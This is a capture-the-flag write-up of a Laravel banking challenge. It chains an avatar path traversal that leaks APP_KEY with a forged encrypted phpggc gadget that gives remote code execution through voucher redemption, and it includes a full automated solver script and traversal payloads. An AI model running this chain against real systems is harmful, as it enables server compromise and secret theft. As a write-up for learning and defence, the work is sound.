@@ -1,0 +1,882 @@
+---
+title: 'Texas A&M University 2026 - Vault'
+description: 'Leaking Laravel APP_KEY through avatar path traversal, forging an encrypted deserialization payload, and turning voucher redemption into RCE to recover the randomized flag file.'
+date: 2026-03-21
+category: 'texas-am-university-2026'
+discipline: 'web-exploit'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: I solved this challenge with LLM
+
+Space Vault v1.0 looked like a lightweight Laravel banking app, but the actual solve path was a full framework chain. The final exploit ended up being:
+
+- client-controlled upload `full_path`
+- authenticated local file read through `/avatar`
+- live `.env` leak to recover `APP_KEY`
+- exact dependency/version recovery from `composer.lock`
+- forged Laravel-encrypted serialized object sent to `/vouchers/redeem`
+- Laravel gadget-chain RCE
+- enumeration of the randomized `/*-flag.txt` path and file read
+
+This challenge was nice because the first bug was obvious once the source was unpacked, but the second half only became reliable after treating Laravel itself as the attack surface.
+
+## Challenge Information
+
+- Category: Web Exploitation
+- Difficulty: Not provided
+- Event: TAMUctf (filed here under Texas A&M University 2026)
+- Challenge: Space Vault v1.0
+- Service: `https://0c28d56a-dae2-4aa6-9eb3-bbc6cd09d9d6.tamuctf.com`
+- Attachments / source code: `vault.tar.gz` with the Laravel app, Dockerfile, nginx config, entrypoint, and a fake local flag
+- Goal: recover a flag in the format `gigem{...}`
+
+## Initial Analysis
+
+The workspace only contained a single file:
+
+```text
+vault.tar.gz
+```
+
+After unpacking it, the app turned out to be a fairly small Laravel 12 service with:
+
+- register and login
+- account update
+- mining rewards
+- voucher creation and redemption
+- transfer history
+- an avatar upload / retrieval flow
+
+The first clue that the shipped `flag.txt` was not the real target was in the container entrypoint:
+
+```sh
+php artisan key:generate --force
+...
+mv /tmp/flag.txt /$(openssl rand -hex 12)-flag.txt
+```
+
+The archive also included:
+
+```text
+gigem{fake_flag_for_testing}
+```
+
+so the real flag would only exist at runtime under a randomized filename at the filesystem root.
+
+The two code paths that mattered most were the avatar flow and voucher redemption.
+
+Avatar upload and avatar retrieval:
+
+```php
+public function updateAvatar(Request $request)
+{
+    $request->validate([
+        'avatar' => 'required|image|max:2048'
+    ]);
+
+    /** @var \App\Models\User $user */
+    $user = Auth::user();
+
+    if ($user->avatar) {
+        $previousPath = Storage::disk('public')->path($user->avatar);
+        if (file_exists($previousPath))
+            unlink($previousPath);
+    }
+
+    $name = $_FILES['avatar']['full_path'];
+    $path = "/var/www/storage/app/public/avatars/$name";
+    $request->file('avatar')->storeAs('avatars', basename($name), 'public');
+
+    $user->avatar = $path;
+    $user->save();
+
+    return redirect()->back();
+}
+
+public function getAvatar(Request $request)
+{
+    $path = Auth::user()->avatar;
+
+    if (!$path)
+        return response()->json(['error' => 'No avatar set.']);
+
+    return response()->file($path);
+}
+```
+
+Voucher redemption:
+
+```php
+public function redeem(Request $request)
+{
+    $data = $request->validate([
+        'voucher' => 'required|string'
+    ]);
+
+    try {
+        $voucher = decrypt($data['voucher']);
+    } catch (DecryptException $e) {
+        return back()->withErrors([
+            'voucher' => 'Invalid voucher.'
+        ]);
+    }
+
+    /** @var \App\Models\User $user */
+    $user = Auth::user();
+    $user->balance += $voucher['amount'];
+    $user->save();
+
+    return redirect()->back();
+}
+```
+
+The avatar code clearly trusts `$_FILES['avatar']['full_path']`, and the voucher code clearly feeds attacker-controlled input into Laravel's `decrypt()` helper.
+
+## Recon / Enumeration
+
+The important routes were:
+
+- `GET /account`
+- `POST /account`
+- `POST /account/avatar`
+- `GET /avatar`
+- `GET /vouchers`
+- `POST /vouchers`
+- `POST /vouchers/redeem`
+- normal auth endpoints at `/register`, `/login`, and `/logout`
+
+From source review, I also noted one extra bug that turned out not to matter for the flag:
+
+```php
+$voucher = encrypt([
+    'amount' => $amount,
+    'created_by' => $user->uuid,
+    'created_at' => Carbon::now()
+]);
+...
+$user->balance += $voucher['amount'];
+```
+
+There is no "used" state for vouchers. If you generate a voucher once, you can redeem it repeatedly. That gives infinite balance, but there was no obvious high-value in-app purchase or admin-only route gated by balance, so it did not look like the full solve.
+
+## Experiment Log
+
+This section is intentionally chronological. I am including the false starts and dead ends because they mattered for how the final chain was found.
+
+### Experiment 1: Unpack the source and map the attack surface
+
+I unpacked `vault.tar.gz`, inspected the controllers, routes, and Docker config, and confirmed:
+
+- the shipped `flag.txt` was fake
+- the real flag would be renamed to `/<hex>-flag.txt` at container startup
+- there was no hidden admin panel or obvious seeded admin account in the Laravel source
+- the most interesting primitives were avatar handling and voucher decryption
+
+At this point the best initial hypothesis was: avatar upload probably gives file read, and file read might expose either the flag path or a framework secret.
+
+### Experiment 2: Check whether the voucher bug alone solves the challenge
+
+Before touching the live service, I considered whether repeated voucher redemption was intended:
+
+- create one voucher
+- redeem it forever
+- grow balance arbitrarily
+- search for a route gated by funds
+
+That path stalled quickly. The source did not contain any "buy flag", "admin purchase", or secret transfer flow. I kept the bug in mind, but it did not explain how to reach the randomized root flag file.
+
+### Experiment 3: Confirm avatar traversal on the live target
+
+I registered a fresh user, logged in, and uploaded a tiny valid PNG with a traversal filename:
+
+```text
+../../../../../../etc/passwd
+```
+
+Then I fetched `/avatar`.
+
+The response returned the real contents of `/etc/passwd`:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+That confirmed two things:
+
+- PHP populated `$_FILES['avatar']['full_path']` from the multipart filename path
+- `response()->file($path)` would happily serve the path Laravel stored in the database
+
+So the avatar feature was not just a path traversal in metadata. It was a real authenticated arbitrary file read.
+
+### Experiment 4: First `.env` read failed because the relative depth was wrong
+
+My first `.env` attempt used:
+
+```text
+../../../../../.env
+```
+
+That produced a `500` error page instead of the file. The target path calculation in the controller prepends:
+
+```text
+/var/www/storage/app/public/avatars/
+```
+
+so the correct traversal had to climb out to `/var/www`, not just to the project root from my local unpacked tree.
+
+The corrected path was:
+
+```text
+../../../../../../var/www/.env
+```
+
+That worked immediately and leaked the live application secret:
+
+```text
+APP_KEY=base64:Zv8t6tllx/ufN3EhNWjJcWpP7now1vbeeZJ5+oEHaUM=
+```
+
+This was the pivot that turned the challenge from "maybe LFI" into "very likely Laravel crypto abuse".
+
+### Experiment 5: Recover exact package versions from `composer.lock`
+
+After `.env`, I read:
+
+- `/var/www/composer.lock`
+- `/var/www/vendor/composer/installed.json`
+- `/var/www/vendor/laravel/framework/composer.json`
+
+That revealed the exact versions in the live container:
+
+- `laravel/framework v12.55.1`
+- `league/commonmark 2.8.2`
+- `laravel/prompts v0.3.15`
+- `monolog/monolog 3.10.0`
+
+This mattered because `phpggc` had gadget chains up to Laravel 10/11 listed explicitly, not Laravel 12.
+
+### Experiment 6: Try reading live vendor PHP sources through avatar LFI
+
+My next attempt was to read framework source files directly from the container, for example:
+
+- `/var/www/vendor/laravel/framework/src/Illuminate/Encryption/Encrypter.php`
+- `/var/www/vendor/laravel/framework/src/Illuminate/Support/Sleep.php`
+- `/var/www/vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php`
+
+This was flaky. Repeated attempts on `.php` files often came back as:
+
+```json
+{"error":"No avatar set."}
+```
+
+even though nearby text files like `composer.lock` and `installed.json` were readable. I did not spend much longer fighting that behavior because it was unnecessary once I already had the exact version numbers.
+
+Instead, I fetched the matching upstream sources from GitHub for those exact versions and compared the relevant class layouts there.
+
+That was an important pivot: once the lockfile told me the exact framework versions, direct vendor source read was a convenience, not a requirement.
+
+### Experiment 7: Local tooling gap
+
+The local environment did not have PHP installed. Since I needed to generate Laravel gadget payloads, I installed the minimum required tooling locally:
+
+- `php-cli`
+- `git`
+
+Then I cloned `phpggc`:
+
+```sh
+git clone https://github.com/ambionics/phpggc.git tools/phpggc
+```
+
+This was necessary because the voucher sink needed a valid Laravel-encrypted serialized payload, and generating that by hand would have been much slower and much easier to get wrong.
+
+### Experiment 8: Evaluate gadget candidates
+
+From `phpggc`, the Laravel candidates that looked potentially relevant were:
+
+- `Laravel/RCE19`
+- `Laravel/RCE20`
+- `Laravel/RCE22`
+
+I did not blindly fire all of them at the service. I first checked the current class layouts against the live package versions:
+
+- `PendingBroadcast::__destruct()` still existed in Laravel 12
+- CommonMark `Environment::dispatch()` still iterated stored listeners
+- `ChainedBatchTruthTest` and `Channel` still matched the expected gadget structure
+
+The cleanest fit was `Laravel/RCE22`, even though `phpggc` labeled it for Laravel 10 and 11:
+
+```php
+public function __destruct()
+{
+    $this->events->dispatch($this->event);
+}
+```
+
+That was good enough to justify a controlled live test.
+
+### Experiment 9: Reproduce Laravel encryption format locally
+
+Knowing `APP_KEY` was not sufficient by itself. The voucher sink expected a ciphertext in Laravel's native format.
+
+From `Illuminate\Encryption\Encrypter`, the relevant behavior was:
+
+```php
+$value = \openssl_encrypt(
+    $serialize ? serialize($value) : $value,
+    strtolower($this->cipher), $this->key, 0, $iv, $tag
+);
+...
+$mac = hash_hmac('sha256', $iv.$value, $key);
+...
+return base64_encode($json);
+```
+
+and during decryption:
+
+```php
+return $unserialize ? unserialize($decrypted) : $decrypted;
+```
+
+So the attack needed:
+
+1. a raw serialized gadget chain
+2. encrypted with `aes-256-cbc`
+3. wrapped into Laravel's base64-of-JSON payload format
+
+I reimplemented that exact format in a tiny local PHP snippet and fed it the raw bytes produced by:
+
+```sh
+php tools/phpggc/phpggc Laravel/RCE22 system '<command>'
+```
+
+### Experiment 10: Harmless RCE test before going for the flag
+
+Before touching the flag path, I used a side-effect command:
+
+```sh
+id > /var/www/public/pwned.txt 2>&1
+```
+
+I encrypted the gadget payload, submitted it to `/vouchers/redeem`, and got a `500` response.
+
+That looked bad at first, but fetching `/pwned.txt` showed:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+So the `500` was actually expected and harmless for exploitation. The likely reason is that `decrypt()` returned an object, and the controller later tried to use it like:
+
+```php
+$voucher['amount']
+```
+
+which breaks after the gadget has already been deserialized and scheduled for destruction.
+
+This was the decisive experiment. At that point the challenge was solved in principle.
+
+### Experiment 11: Enumerate the randomized flag path
+
+With RCE confirmed, the next command was:
+
+```sh
+find / -maxdepth 1 -name "*flag.txt" -print > /var/www/public/flagpath.txt 2>&1
+```
+
+Fetching `/flagpath.txt` returned:
+
+```text
+/45b43743e0614f50f796fce4-flag.txt
+```
+
+That matched the entrypoint behavior exactly.
+
+### Experiment 12: Read the real flag
+
+The final command was:
+
+```sh
+cat $(cat /var/www/public/flagpath.txt | tail -n 1) > /var/www/public/realflag.txt 2>&1
+```
+
+Fetching `/realflag.txt` returned the flag:
+
+```text
+gigem{142v31_d3c2yp7_15_d4n9320u5_743f9c}
+```
+
+After that, I cleaned up the small public proof files I had written during testing.
+
+## Vulnerability Discovery
+
+The full exploit depended on three core bugs and one deployment detail.
+
+### 1. Avatar `full_path` traversal gives authenticated arbitrary file read
+
+The controller stores the upload path using:
+
+```php
+$name = $_FILES['avatar']['full_path'];
+$path = "/var/www/storage/app/public/avatars/$name";
+```
+
+but actually writes the file to:
+
+```php
+storeAs('avatars', basename($name), 'public')
+```
+
+That mismatch is the bug. The file is saved with a safe basename, but the database stores the user-controlled path with any `../` segments intact.
+
+When `/avatar` later does:
+
+```php
+return response()->file($path);
+```
+
+the stored path is treated as authoritative. That turns a profile image feature into a general file-read primitive.
+
+### 2. `.env` leak reveals the live `APP_KEY`
+
+Reading:
+
+```text
+../../../../../../var/www/.env
+```
+
+through the avatar feature exposed the runtime encryption key:
+
+```text
+APP_KEY=base64:Zv8t6tllx/ufN3EhNWjJcWpP7now1vbeeZJ5+oEHaUM=
+```
+
+This key is especially valuable in Laravel because:
+
+- cookies are signed/encrypted with it
+- encrypted application data uses it
+- the `decrypt()` helper trusts anything that validates under it
+
+### 3. Voucher redemption is an attacker-controlled `decrypt()` sink
+
+The voucher redeem route blindly passes attacker input to:
+
+```php
+$voucher = decrypt($data['voucher']);
+```
+
+Laravel's decrypt path unserializes by default, so if the attacker knows `APP_KEY`, they can send any serialized object graph they want, encrypted as a valid Laravel payload.
+
+This is the critical observation. Without the leaked key, `decrypt()` is just a parser. With the leaked key, it becomes a deserialization sink.
+
+### 4. Deployment detail: the flag exists at a randomized root path
+
+The entrypoint does:
+
+```sh
+mv /tmp/flag.txt /$(openssl rand -hex 12)-flag.txt
+```
+
+So even after reaching file read or code execution, the exploit still has to discover the renamed path dynamically. That is why the final RCE stage enumerated `/` instead of assuming a fixed flag location.
+
+## Exploitation
+
+The clean solve path only needed one authenticated user and one local helper tool.
+
+### Step 1: Register and log in
+
+I created a normal user through `/register` and authenticated normally through `/login`.
+
+There was no need for an auth bypass anywhere in this challenge.
+
+### Step 2: Use the avatar feature to confirm LFI
+
+I uploaded a valid 1x1 PNG with the filename:
+
+```text
+../../../../../../etc/passwd
+```
+
+and then fetched `/avatar` to confirm the bug.
+
+### Step 3: Leak `.env`
+
+Using the same primitive, I uploaded:
+
+```text
+../../../../../../var/www/.env
+```
+
+and recovered the runtime `APP_KEY`.
+
+### Step 4: Recover exact versions
+
+I read `composer.lock` and `installed.json` from the target, then verified the Laravel gadget chain locally against:
+
+- Laravel `12.55.1`
+- CommonMark `2.8.2`
+- Laravel Prompts `0.3.15`
+
+### Step 5: Build an encrypted serialized payload
+
+I used `phpggc` to generate a raw gadget chain:
+
+```sh
+php tools/phpggc/phpggc Laravel/RCE22 system '<command>'
+```
+
+Then I encrypted the raw bytes with the leaked `APP_KEY` using the same format as `Illuminate\Encryption\Encrypter`.
+
+The result was a valid Laravel ciphertext suitable for the `voucher` parameter.
+
+### Step 6: Redeem the malicious voucher and expect a `500`
+
+Submitting the forged payload to:
+
+```text
+POST /vouchers/redeem
+```
+
+did not return a clean success page. It usually returned `500`. That was still exploitable because the object had already been deserialized, and the gadget chain triggered on shutdown.
+
+The controller only crashed afterwards when it tried to treat the returned object as an array.
+
+### Step 7: Test RCE with a public side effect
+
+I first wrote the output of `id` into:
+
+```text
+/var/www/public/pwned.txt
+```
+
+to avoid wasting time on flag enumeration if the gadget were incompatible.
+
+That test succeeded and confirmed code execution as `www-data`.
+
+### Step 8: Find the randomized flag file
+
+With RCE confirmed, I used:
+
+```sh
+find / -maxdepth 1 -name "*flag.txt" -print
+```
+
+and wrote the result into a world-readable file under `/var/www/public/`.
+
+### Step 9: Copy the real flag into a web-readable location
+
+Once the randomized path was known, I copied the real flag into:
+
+```text
+/var/www/public/realflag.txt
+```
+
+and fetched it over HTTP.
+
+This was the simplest exfiltration channel. No reverse shell, no interactive TTY, and no need to smuggle output back through the voucher UI.
+
+## Request / Interaction Examples
+
+The avatar traversal can be exercised from Python very directly:
+
+```python
+files = {
+    "avatar": ("../../../../../../etc/passwd", tiny_png_bytes, "image/png")
+}
+session.post(BASE_URL + "/account/avatar", data={"_token": csrf}, files=files)
+print(session.get(BASE_URL + "/avatar").text)
+```
+
+The malicious voucher submission looks just like a normal redeem request, except the `voucher` value is a forged Laravel ciphertext:
+
+```http
+POST /vouchers/redeem HTTP/1.1
+Host: 0c28d56a-dae2-4aa6-9eb3-bbc6cd09d9d6.tamuctf.com
+Content-Type: application/x-www-form-urlencoded
+
+_token=<csrf>&voucher=<laravel-encrypted-gadget-payload>
+```
+
+The key point is that the request body does not need to look special to the application. Once `APP_KEY` is known, the payload is perfectly valid from Laravel's point of view.
+
+## Solver Script
+
+I attached the standalone remote solver as [solve_remote.py](./solve_remote.py). It performs the full chain:
+
+- register and log in
+- use avatar LFI to leak `.env`
+- parse `APP_KEY`
+- generate a `Laravel/RCE22` payload through `phpggc`
+- encrypt it in Laravel format
+- use `/vouchers/redeem` as the deserialization sink
+- enumerate the root flag path
+- read and print the flag
+
+The full script is included below.
+
+```python
+#!/usr/bin/env python3
+import base64
+import os
+import random
+import re
+import shlex
+import shutil
+import string
+import subprocess
+import sys
+import time
+
+import requests
+
+BASE_URL = os.getenv(
+    "BASE_URL",
+    "https://0c28d56a-dae2-4aa6-9eb3-bbc6cd09d9d6.tamuctf.com",
+)
+PASSWORD = os.getenv("USER_PASSWORD", "P@ssw0rd123!")
+PHPGGC = os.getenv("PHPGGC", "tools/phpggc/phpggc")
+TIMEOUT = 20
+FLAG_RE = re.compile(r"gigem\{[^}\n]+\}")
+
+TINY_PNG = base64.b64decode(
+    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO7Z0XcAAAAASUVORK5CYII="
+)
+
+ENCRYPT_SNIPPET = r"""
+$key = $argv[1];
+if (str_starts_with($key, 'base64:')) {
+    $key = base64_decode(substr($key, 7));
+}
+$cipher = 'aes-256-cbc';
+$payload = stream_get_contents(STDIN);
+$iv = random_bytes(openssl_cipher_iv_length(strtolower($cipher)));
+$value = openssl_encrypt($payload, strtolower($cipher), $key, 0, $iv, $tag);
+$iv = base64_encode($iv);
+$tag = base64_encode($tag ?? '');
+$mac = hash_hmac('sha256', $iv.$value, $key);
+echo base64_encode(json_encode(compact('iv', 'value', 'mac', 'tag'), JSON_UNESCAPED_SLASHES));
+"""
+
+
+def rand_user(prefix: str = "u") -> str:
+    alphabet = string.ascii_lowercase + string.digits
+    return prefix + "".join(random.choice(alphabet) for _ in range(8))
+
+
+def require_tool(name: str) -> None:
+    if shutil.which(name) is None:
+        raise RuntimeError(f"missing required tool: {name}")
+
+
+def require_file(path: str) -> None:
+    if not os.path.exists(path):
+        raise RuntimeError(f"missing required file: {path}")
+
+
+def parse_hidden_token(html: str) -> str:
+    m = re.search(r'name="_token" value="([^"]+)"', html)
+    if not m:
+        raise RuntimeError("could not find form CSRF token")
+    return m.group(1)
+
+
+def parse_meta_token(html: str) -> str:
+    m = re.search(r'name="csrf-token" content="([^"]+)"', html)
+    if not m:
+        raise RuntimeError("could not find meta CSRF token")
+    return m.group(1)
+
+
+def make_session() -> requests.Session:
+    s = requests.Session()
+    s.headers["User-Agent"] = "Mozilla/5.0"
+    return s
+
+
+def register_and_login(sess: requests.Session, username: str, password: str) -> None:
+    r = sess.get(f"{BASE_URL}/register", timeout=TIMEOUT)
+    token = parse_hidden_token(r.text)
+    r = sess.post(
+        f"{BASE_URL}/register",
+        data={"_token": token, "username": username, "password": password, "password2": password},
+        allow_redirects=False,
+        timeout=TIMEOUT,
+    )
+    if r.status_code not in (302, 303):
+        raise RuntimeError(f"register failed: HTTP {r.status_code}")
+
+    r = sess.get(f"{BASE_URL}/login", timeout=TIMEOUT)
+    token = parse_hidden_token(r.text)
+    r = sess.post(
+        f"{BASE_URL}/login",
+        data={"_token": token, "username": username, "password": password},
+        allow_redirects=False,
+        timeout=TIMEOUT,
+    )
+    if r.status_code not in (302, 303):
+        raise RuntimeError(f"login failed: HTTP {r.status_code}")
+
+
+def account_csrf(sess: requests.Session) -> str:
+    r = sess.get(f"{BASE_URL}/account", timeout=TIMEOUT)
+    if r.status_code != 200:
+        raise RuntimeError(f"/account failed: HTTP {r.status_code}")
+    return parse_meta_token(r.text)
+
+
+def vouchers_csrf(sess: requests.Session) -> str:
+    r = sess.get(f"{BASE_URL}/vouchers", timeout=TIMEOUT)
+    if r.status_code != 200:
+        raise RuntimeError(f"/vouchers failed: HTTP {r.status_code}")
+    return parse_meta_token(r.text)
+
+
+def avatar_read(sess: requests.Session, target_path: str) -> str:
+    token = account_csrf(sess)
+    traversal = "../../../../../../" + target_path.lstrip("/")
+    files = {"avatar": (traversal, TINY_PNG, "image/png")}
+    r = sess.post(
+        f"{BASE_URL}/account/avatar",
+        data={"_token": token},
+        files=files,
+        allow_redirects=False,
+        timeout=TIMEOUT,
+    )
+    if r.status_code not in (302, 303):
+        raise RuntimeError(f"avatar upload failed: HTTP {r.status_code}")
+
+    r = sess.get(f"{BASE_URL}/avatar", timeout=TIMEOUT)
+    if r.status_code != 200:
+        raise RuntimeError(f"/avatar failed: HTTP {r.status_code}")
+    return r.text
+
+
+def leak_app_key(sess: requests.Session) -> str:
+    env_text = avatar_read(sess, "/var/www/.env")
+    m = re.search(r"^APP_KEY=(.+)$", env_text, re.MULTILINE)
+    if not m:
+        raise RuntimeError("APP_KEY not found in leaked .env")
+    return m.group(1).strip()
+
+
+def build_encrypted_payload(app_key: str, command: str) -> str:
+    raw = subprocess.check_output(
+        ["php", PHPGGC, "Laravel/RCE22", "system", command],
+        cwd=os.getcwd(),
+    )
+    enc = subprocess.run(
+        ["php", "-r", ENCRYPT_SNIPPET, app_key],
+        input=raw,
+        capture_output=True,
+        check=True,
+    )
+    return enc.stdout.decode().strip()
+
+
+def redeem_payload(sess: requests.Session, payload: str) -> int:
+    token = vouchers_csrf(sess)
+    r = sess.post(
+        f"{BASE_URL}/vouchers/redeem",
+        data={"_token": token, "voucher": payload},
+        allow_redirects=False,
+        timeout=TIMEOUT,
+    )
+    return r.status_code
+
+
+def run_command(sess: requests.Session, app_key: str, command: str) -> int:
+    payload = build_encrypted_payload(app_key, command)
+    return redeem_payload(sess, payload)
+
+
+def fetch_public(path: str) -> str:
+    r = requests.get(f"{BASE_URL}{path}", timeout=TIMEOUT)
+    if r.status_code != 200:
+        raise RuntimeError(f"failed to fetch {path}: HTTP {r.status_code}")
+    return r.text
+
+
+def main() -> int:
+    require_tool("php")
+    require_file(PHPGGC)
+
+    sess = make_session()
+    username = rand_user()
+    register_and_login(sess, username, PASSWORD)
+    print(f"[+] logged in as {username}")
+
+    app_key = leak_app_key(sess)
+    print(f"[+] leaked APP_KEY: {app_key}")
+
+    status = run_command(sess, app_key, "id > /var/www/public/pwned.txt 2>&1")
+    print(f"[+] benign RCE test returned HTTP {status}")
+    print(fetch_public("/pwned.txt").strip())
+
+    status = run_command(
+        sess,
+        app_key,
+        'find / -maxdepth 1 -name "*flag.txt" -print > /var/www/public/flagpath.txt 2>&1',
+    )
+    print(f"[+] flag-path enumeration returned HTTP {status}")
+    flag_path = fetch_public("/flagpath.txt").strip().splitlines()[-1]
+    print(f"[+] flag path: {flag_path}")
+
+    status = run_command(
+        sess,
+        app_key,
+        f"cat {shlex.quote(flag_path)} > /var/www/public/realflag.txt 2>&1",
+    )
+    print(f"[+] flag read returned HTTP {status}")
+    flag_text = fetch_public("/realflag.txt")
+    m = FLAG_RE.search(flag_text)
+    if not m:
+        raise RuntimeError("flag not found in /realflag.txt")
+    print(m.group(0))
+
+    try:
+        cleanup = "rm -f /var/www/public/pwned.txt /var/www/public/flagpath.txt /var/www/public/realflag.txt"
+        run_command(sess, app_key, cleanup)
+    except Exception:
+        pass
+
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+## Getting the Flag
+
+The real flag recovered from the live service was:
+
+```text
+gigem{142v31_d3c2yp7_15_d4n9320u5_743f9c}
+```
+
+## Key Takeaways
+
+- Treat any use of `$_FILES['...']['full_path']` as hostile input. It is attacker-controlled metadata.
+- A path traversal that only writes to the database can still become a file-read bug later if another endpoint trusts the stored path.
+- In Laravel, leaking `APP_KEY` is often enough to turn a `decrypt()` call into a deserialization sink.
+- Runtime `500` errors do not disprove deserialization/RCE when the gadget triggers on object destruction.
+- `composer.lock` is often more useful than raw source read. Exact versioning makes gadget verification much easier.
+- Not every bug is part of the intended chain. Voucher replay was real, but it was not the shortest route to the flag.
+
+## Final Thoughts
+
+Space Vault v1.0 was a good example of a challenge where the first bug was easy to spot, but the correct pivot mattered more than the initial primitive. The avatar issue gave file read. The real challenge was noticing that the file read exposed the one secret that made Laravel's own crypto and serialization layer turn against the app.
+
+The clean solve ended up being:
+
+- leak `APP_KEY`
+- forge encrypted gadget payload
+- accept the `500`
+- use RCE once to enumerate the randomized flag path
+- read the flag through a boring public file write
+
+That last step was the nicest part of the chain. Once code execution existed, there was no reason to overcomplicate exfiltration.
